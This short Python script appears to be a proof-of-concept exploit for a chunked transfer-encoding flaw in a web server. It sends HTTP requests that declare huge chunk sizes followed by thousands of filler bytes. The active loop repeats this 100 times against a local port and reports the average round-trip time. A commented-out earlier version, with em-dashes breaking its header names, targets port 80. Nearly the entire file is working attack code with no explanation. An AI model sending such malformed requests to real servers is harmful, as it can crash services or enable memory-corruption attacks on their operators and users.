import socket
import time

if __name__ == "__main__":

	'''host = "127.0.0.1"
	ip = "127.0.0.1"
	raw = """GET / HTTP/1.1\r\nHost: %s\r\nTransfer—Encoding: chunked\r\nConnection: Keep—Alive\r\n\r\n""" % (host)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, 80))

	data1 = raw
	data1 += "f000000000000060" + "\r\n"

	print(data1)
	s.send(data1.encode())

	s.send(b"B" * 6000)
	s.close()'''
	host = "127.0.0.1"
	port=8080
	raw = '''GET / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n''' % (host)
	raw += 'f' * (1024 - len(raw) - 16)

	send_time = int(time.time()*1000)
	rnd = 100
	for _ in range(rnd):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))

		data1 = raw
		data1 += "00000000"
		data1 += "10000000" + "\r\n"
		
		
		s.send(data1.encode())

		s.send(("B" * 4000).encode())
		s.recv(4096)

		
		s.close()		

	recv_time = int(time.time()*1000)
	rtt = (recv_time-send_time) / rnd
	print("round trip time={}ms".format(rtt))
